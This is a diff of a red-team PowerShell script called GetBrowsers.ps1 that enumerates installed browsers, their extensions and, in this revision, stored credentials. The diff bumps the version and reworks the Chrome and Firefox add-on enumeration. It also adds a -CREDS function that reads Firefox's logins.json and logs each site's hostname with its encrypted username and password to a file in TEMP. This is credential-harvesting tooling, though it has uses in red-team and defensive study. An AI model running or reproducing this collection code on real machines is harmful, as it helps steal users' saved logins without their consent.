@@ -5,7 +5,7 @@
 .Author r00t-3xp10it (SSA RedTeam @2020)
   Required Dependencies: IE, Firefox, Chrome
   Optional Dependencies: None
-  PS Script Dev Version: v1.10
+  PS Script Dev Version: v1.11
 
 .DESCRIPTION
    Standalone Powershell script to dump Installed browsers information sutch as: HomePage, Browser Version
@@ -46,7 +46,7 @@ $Path = $null
 $mpset = $False
 $param1 = $args[0] # User Inputs [Arguments]
 $param2 = $args[1] # User Inputs [Arguments]
-$host.UI.RawUI.WindowTitle = " @GetBrowsers v1.10"
+$host.UI.RawUI.WindowTitle = " @GetBrowsers v1.11"
 ## Auto-Set @Args in case of User empty inputs (Set LogFile Path).
 If(-not($param2)){$LogFilePath = "$env:TMP"}else{$LogFilePath = "$param2";$mpset = $True}
 If(-not($param1)){
@@ -60,7 +60,8 @@ If(-not($param1)){
     echo "./GetBrowsers.ps1 -ALL              Enumerates IE, Firefox, Chrome information." >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -CHROME           Enumerates Chrome Browser information Only." >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -FIREFOX          Enumerates Firefox Browser information Only." >> $LogFilePath\BrowserEnum.log
-    echo "./GetBrowsers.ps1 -ADDONS           Enumerates ALL browsers extentions installed.`n" >> $LogFilePath\BrowserEnum.log
+    echo "./GetBrowsers.ps1 -ADDONS           Enumerates ALL browsers extentions installed." >> $LogFilePath\BrowserEnum.log
+    echo "./GetBrowsers.ps1 -CREDS            Enumerates ALL browsers credentials stored.`n" >> $LogFilePath\BrowserEnum.log
     echo "The following Optional args are available:" >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -IE `$env:TMP      Enumerates selected browser and saves logfile to TEMP.`n" >> $LogFilePath\BrowserEnum.log
     Get-Content $LogFilePath\BrowserEnum.log;Remove-Item $LogFilePath\BrowserEnum.log -Force
@@ -381,15 +382,37 @@ function ADDONS {
     $searchScopes | % {Get-ChildItem -Path $_ | % {Get-ItemProperty -Path $_.PSPath} | Select-Object @{n="Name";e={Split-Path $_.PSPath -leaf}},FriendlyName} | Sort-Object -Unique -Property name >> $LogFilePath\BrowserEnum.log
 
     ## TODO: Retrieve Chrome add-ins (BETA DEV)
-    Get-ChildItem "\\$env:COMPUTERNAME\c$\users\*\appdata\local\Google\Chrome\User Data\Default\Extensions\*\*\manifest.json" -ErrorAction SilentlyContinue | % {
-        $path = $_.FullName;$_.FullName -match 'users\\(.*?)\\appdata'|Out-Null
-        Get-Content $_.FullName -Raw|ConvertFrom-Json|select @{n='ComputerName';e={$env:COMPUTERNAME}}, @{n='User';e={$Matches[1]}}, Name, Version, @{n='Path';e={$path}} >> $LogFilePath\BrowserEnum.log
+    $Json = Get-Content "\\$env:COMPUTERNAME\c$\users\*\appdata\local\Google\Chrome\User Data\Default\Extensions\*\*\manifest.json" -Raw|ConvertFrom-Json|select *
+    $Json|select-object -property name,version,update_url >> $LogFilePath\BrowserEnum.log
+
+    ##TODO: firefox
+    If(-not(Test-Path "$Env:AppData\Mozilla\Firefox\Profiles\*.default\extensions.json")){
+        echo "None FireFox ADDONS found .." >> $LogFilePath\BrowserEnum.log
+    }else{
+        $Json = Get-Content "$Env:AppData\Mozilla\Firefox\Profiles\*.default\extensions.json" -Raw|ConvertFrom-Json|select *
+        $Json.addons|select-object id,version,rootURI >> $LogFilePath\BrowserEnum.log
     }
 }
 
 
+function Creds {
+    ## TODO: Retrieve FireFox Credentials
+    echo "`n`nLogins (Firefox)" >> $LogFilePath\BrowserEnum.log
+    echo "--------------------" >> $LogFilePath\BrowserEnum.log
+        If(-not(Test-Path "$Env:AppData\Mozilla\Firefox\Profiles\*.default\logins.json")){
+            echo "FireFox logins.json not found .." >> $LogFilePath\BrowserEnum.log
+        }else{
+            $Json = get-content $Env:AppData\Mozilla\Firefox\Profiles\*.default\logins.json|ConvertFrom-Json|select *
+            $Json.logins|select-object hostname,encryptedUsername >> $LogFilePath\BrowserEnum.log
+            $Json.logins|select-object hostname,encryptedPassword >> $LogFilePath\BrowserEnum.log
+        }
+}
+
+
+
 ## Jump Links (Functions)
 If($param1 -eq "-IE"){IE_Dump}
+If($param1 -eq "-CREDS"){Creds}
 If($param1 -eq "-CHROME"){CHROME}
 If($param1 -eq "-ADDONS"){ADDONS}
 If($param1 -eq "-FIREFOX"){FIREFOX}
